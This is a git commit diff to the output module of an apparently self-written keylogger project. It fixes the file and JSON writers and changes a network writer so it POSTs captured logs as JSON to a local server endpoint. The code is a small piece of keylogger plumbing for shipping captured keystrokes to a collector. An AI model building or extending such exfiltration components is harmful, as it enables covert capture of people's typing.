04e7abe52cd68e79c42544832c7443216ee22146
Moti7950 <shalom7950@gmail.com>
2025-02-25 12:38:08 +0200

    Update code errors and update the correct submission to the JSON file

--- key_logger/component/writer.py
+++ key_logger/component/writer.py
@@ -4,23 +4,26 @@ import requests
 
 class FileWriter(Writer):
     @staticmethod
-    def send_data(data:str, path) -> None:
-        with open(path ,"w") as file:
+    def send_data(data: str, path) -> None:
+        with open(path, "w") as file:
             file.write(data)
 
 
 class JsonWriter(Writer):
     @staticmethod
     def send_data(data: dict, path) -> None:
-        with open (path , "w") as Json_File:
-            json.dump(data)
+        with open(path, "w") as Json_File:
+            json.dump(data, Json_File)
 
 
 class NetworkWriter(Writer):
     @staticmethod
-    def send_data(data) -> int:
+    def send_data(data):
         url = "http://127.0.0.1:5556/logs"
-        response = requests.post(url, data=data)
+        headers = {"Content-Type": "application/json"}
+
+        json_data = json.dumps(data)  # Convert to JSON string
+        response = requests.post(url, json=data, headers=headers)  # ✅ Changed "data" to "json"
 
         return response.status_code
 
